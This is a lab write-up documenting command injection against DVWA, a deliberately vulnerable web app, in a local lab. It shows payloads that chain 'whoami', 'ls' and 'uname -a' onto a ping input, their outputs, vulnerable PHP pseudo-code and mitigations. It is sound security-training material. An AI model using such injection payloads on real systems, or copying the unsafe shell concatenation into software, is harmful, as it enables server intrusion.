# Phase 2 – Command Injection (DVWA)

> **Lab:** Damn Vulnerable Web Application (DVWA)  
> **Category:** Command Injection  
> **OWASP:** A03:2021 – Injection  
> **Difficulty:** Low Security (DVWA)  
> **Environment:** Local Virtual Lab

---

# Objective

The objective of this lab is to identify and exploit a **Command Injection** vulnerability within DVWA and verify whether user-controlled input is executed directly by the underlying operating system.

This exercise demonstrates how insecure handling of user input can lead to **Remote Command Execution (RCE)**, allowing an attacker to execute arbitrary operating system commands on the target server.

---

# Lab Environment

| Component | Value |
|-----------|------|
| Attacker Machine | Kali Linux |
| Target Machine | DVWA (Apache + PHP) |
| Target URL | `http://10.10.10.102/DVWA/vulnerabilities/exec/` |
| Security Level | Low |
| Vulnerability | Command Injection |

---

# Background

Command Injection occurs when an application passes unsanitized user input directly to a system shell.

A vulnerable application typically executes commands similar to:

```bash
ping <user_input>
```

If user input is not validated, an attacker can inject additional operating system commands.

Example:

```text
127.0.0.1; whoami
```

The operating system interprets this as:

```bash
ping 127.0.0.1
whoami
```

As a result, both commands are executed sequentially.

---

# Testing Methodology

The assessment was performed in multiple stages.

## Step 1 – Verify Normal Functionality

Input:

```text
127.0.0.1
```

Expected Behaviour:

- Application performs ICMP ping.
- No additional command execution.
- Output only contains ping statistics.

---

## Step 2 – Test for Command Injection

Payload:

```text
127.0.0.1; whoami
```

Purpose:

Determine whether the application allows execution of arbitrary shell commands.

---

## Step 3 – Execute Additional Commands

### List Directory Contents

Payload

```text
127.0.0.1; ls
```

Purpose

Enumerate files located inside the current web directory.

---

### Retrieve Operating System Information

Payload

```text
127.0.0.1; uname -a
```

Purpose

Identify operating system, kernel version and architecture.

---

# Proof of Concept

## Payload 1

```text
127.0.0.1
```

### Result

Application executed only the ping command successfully.

---

## Payload 2

```text
127.0.0.1; whoami
```

### Output

```text
www-data
```

### Observation

The injected command executed successfully.

The web application is running under the **www-data** service account.

---

## Payload 3

```text
127.0.0.1; ls
```

### Output

```text
help
index.php
source
```

### Observation

Directory listing confirms arbitrary operating system command execution.

---

## Payload 4

```text
127.0.0.1; uname -a
```

### Output

```text
Linux kali 6.12.25-amd64 ...
```

### Observation

Successfully retrieved operating system information.

---

# Technical Analysis

The vulnerable application appears to concatenate user input directly into a shell command.

Pseudo-code representation:

```php
$cmd = "ping " . $_GET['ip'];
system($cmd);
```

Because the input is executed by a shell, shell metacharacters such as

```text
;
&&
||
|
```

allow execution of additional commands.

---

# Security Impact

If exploited on a production system, an attacker may be able to:

- Execute arbitrary operating system commands
- Enumerate server information
- Access sensitive files
- Read application configuration
- Discover credentials
- Upload malicious payloads
- Establish persistence
- Achieve Remote Code Execution (RCE)

---

# Severity Assessment

| Metric | Rating |
|---------|--------|
| Vulnerability | Command Injection |
| Risk | Critical |
| Exploitability | High |
| Impact | High |
| Authentication Required | Yes (DVWA Lab) |

---

# Evidence

## Evidence 1 – Normal Ping

Shows expected application behaviour without command injection.

**Screenshot**

```
documentation/evidence/phase2-command-injection/01-normal-ping.png
```

---

## Evidence 2 – Directory Enumeration

Injected payload:

```text
127.0.0.1; ls
```

Result:

- help
- index.php
- source

**Screenshot**

```
documentation/evidence/phase2-command-injection/02-ls-command.png
```

---

## Evidence 3 – System Enumeration

Injected payload:

```text
127.0.0.1; uname -a
```

Successfully retrieved:

- Operating system
- Kernel version
- CPU architecture

**Screenshot**

```
documentation/evidence/phase2-command-injection/03-uname-command.png
```

---

## Evidence 4 – User Enumeration

Injected payload:

```text
127.0.0.1; whoami
```

Result:

```text
www-data
```

This confirms execution occurs under the Apache web server account.

---

# Root Cause

The application directly passes user-controlled input into an operating system command without:

- Input validation
- Input sanitization
- Command escaping

As a result, shell metacharacters are interpreted by the operating system.

---

# Mitigation

To prevent command injection:

- Never construct shell commands using user input.
- Use language-native APIs instead of shell execution.
- Validate input using allowlists.
- Escape shell arguments where command execution is unavoidable.
- Execute applications with least-privilege accounts.
- Disable unnecessary operating system utilities.

---

# Key Learning Outcomes

After completing this lab, the following concepts were demonstrated:

- Identification of Command Injection vulnerabilities
- Safe verification of Remote Command Execution
- Basic operating system enumeration
- Service account identification
- Understanding of shell command chaining
- Importance of secure input validation

---

# Conclusion

The DVWA Command Injection module is vulnerable to arbitrary operating system command execution.

Multiple payloads (`whoami`, `ls`, and `uname -a`) executed successfully, confirming that user input is directly passed to the system shell without sanitization.

This vulnerability can lead to full server compromise if exploited in a production environment and therefore should be considered **Critical**.

---